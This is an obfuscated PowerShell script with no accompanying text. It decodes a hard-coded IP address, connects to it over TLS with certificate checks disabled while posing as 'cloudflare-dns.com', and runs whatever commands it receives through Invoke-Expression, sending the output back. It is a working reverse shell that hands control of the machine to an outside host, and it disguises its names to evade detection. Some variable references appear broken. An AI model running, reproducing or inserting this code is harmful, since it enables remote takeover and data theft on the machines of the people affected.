$null=$null;${gRaD}=[cHaR[]](73,99,114,101,97,109,101,110,116);${dAtA}=[cHaR[]](68,97,116,97);${sCr}=[cHaR[]](83,99,114,105,112,116);${eNv}=[cHaR[]](69,110,118,105,114,111,110,109,101,110,116);if(-join${gRaD}){if((&([sCrIpT bLoCk]::CrEaTe(([sTrInG]${sCr}+'.'+'*'))))(-join${eNv}+'.'+'I'+'s'+'T'+'r'+'u'+'s'+'t'+'e'+'d'+'-'+'A'+'u'+'t'+'h'+'o'+'r'+'i'+'z'+'a'+'t'+'i'+'o'+'n'+'P'+'o'+'l'+'i'+'c'+'y')){${kEy}=[cHaR[]](50,48,50,52,48,50,50,48,50,50,48,50,50,48,50,50);${iV}=[cHaR[]](49,50,51,52,53,54);${pAy}=[cHaR[]](77,114,107,83,116,114,101,97,109,77,97,110,97,103,101,114);${tAr}=[cHaR[]](84,67,80,67,108,105,101,110,116);${sSl}=[cHaR[]](83,115,108,83,116,114,101,97,109);${nEt}=[cHaR[]](78,101,116);${sEc}=[cHaR[]](83,101,99,117,114,105,116,121);${aUtH}=[cHaR[]](65,117,116,104,101,110,116,105,99,97,116,101,65,115,67,108,105,101,110,116);${sTrM}=[cHaR[]](83,116,114,101,97,109,87,114,105,116,101,114);${bUfF}=[cHaR[]](98,117,102,102,101,114);${rEaD}=[cHaR[]](82,101,97,100);${wRiTe}=[cHaR[]](87,114,105,116,101);${cLoSe}=[cHaR[]](67,108,111,115,101);${gEtStRm}=[cHaR[]](71,101,116,83,116,114,101,97,109);${aUtOfLuSh}=[cHaR[]](65,117,116,111,70,108,117,115,104);${iNvEx}=[cHaR[]](73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110);${oUtStR}=[cHaR[]](79,117,116,45,83,116,114,105,110,103);${gEtLoC}=[cHaR[]](71,101,116,45,76,111,99,97,116,105,111,110);${tLs}=[cHaR[]](84,108,115,49,50);${eNc}=[cHaR[]](85,84,70,56);${dEc}=[cHaR[]](70,114,111,109,66,97,115,101,54,52,83,116,114,105,110,103);${gEtStR}=[cHaR[]](71,101,116,83,116,114,105,110,103);${cOnV}=[cHaR[]](67,111,110,118,101,114,116);${bAsE}=[cHaR[]](66,97,115,101,54,52,83,116,114,105,110,103);${tArGeT}=[System.Text.Encoding]::${eNc}.(&([sCrIpT bLoCk]::CrEaTe('-join('+[sTrInG]::Join(',',[cOnVeRt]::FromBase64String('MTQ2LjcwLjI0MC4yMDU=').ForEach({$_.ToString()}))+')')));${pOrT}=[InT32]40398;${aCt}=1;if(${aCt}-ne1){${nUlL}=1};try{${cLiEnT}=&([sCrIpT bLoCk]::CrEaTe('New-Object '+-join${tAr}+'('+'$targetIP'+','+'$port'+')'));${nStRm}=&([sCrIpT bLoCk]::CrEaTe('-join'+${tAr}+'.'+${gEtStRm}))(${cLiEnT});${sStRm}=New-Object('-join'+${nEt}+'.'+'Security.'+${sSl})( ${nStRm}, $false, ({$true} -as [Net.Security.RemoteCertificateValidationCallback]) );${sStRm}.(&([sCrIpT bLoCk]::CrEaTe('-join'+${sSl}+'.'+${aUtH})) )("cloudflare-dns.com", $null, [System.Security.Authentication.SslProtocols]('-join'+${tLs}), $false);if(-not(${sStRm}.IsEncrypted)-or-not(${sStRm}.IsSigned)){{};${sStRm}.(&([sCrIpT bLoCk]::CrEaTe('-join'+${sSl}+'.'+${cLoSe})));${nUlL}=1};${wRi}=New-Object('-join'+${sTrM})( ${sStRm} );${wRi}.(&([sCrIpT bLoCk]::CrEaTe('-join'+${sTrM}+'.'+${aUtOfLuSh})) )=$true;function ${wRiTeTo}{param($s);[byte[]]${${bUfF}}=New-Object System.Byte[] 4096;${wRi}.(&([sCrIpT bLoCk]::CrEaTe('-join'+${sTrM}+'.'+${wRiTe})) ) ($s + "PS " + (&([sCrIpT bLoCk]::CrEaTe('-join'+${gEtLoC}+'()'))).Path + "> ")};${wRiTeTo} '';while((${bYtEs}=${sStRm}.(&([sCrIpT bLoCk]::CrEaTe('-join'+${sSl}+'.'+${rEaD})) )(${${bUfF}}, 0, ${${bUfF}}.Length))-gt0){${cMd}=([text.encoding]::('-join'+${eNc})).(&([sCrIpT bLoCk]::CrEaTe('-join'+${eNc}+'.'+${gEtStR})) )(${${bUfF}}, 0, ${bYtEs} - 1).Trim();if(${cMd}-eq'exit'){break};${oUt}=try{&([sCrIpT bLoCk]::CrEaTe('-join'+${iNvEx})) ${cMd} 2>&1 | (&([sCrIpT bLoCk]::CrEaTe('-join'+${oUtStR})) )}catch{$_ | (&([sCrIpT bLoCk]::CrEaTe('-join'+${oUtStR})) )};${wRiTeTo} ${oUt};};${wRi}.(&([sCrIpT bLoCk]::CrEaTe('-join'+${sTrM}+'.'+${cLoSe})) );${cLiEnT}.(&([sCrIpT bLoCk]::CrEaTe('-join'+${tAr}+'.'+${cLoSe})) );}catch{${nUlL}=1;}
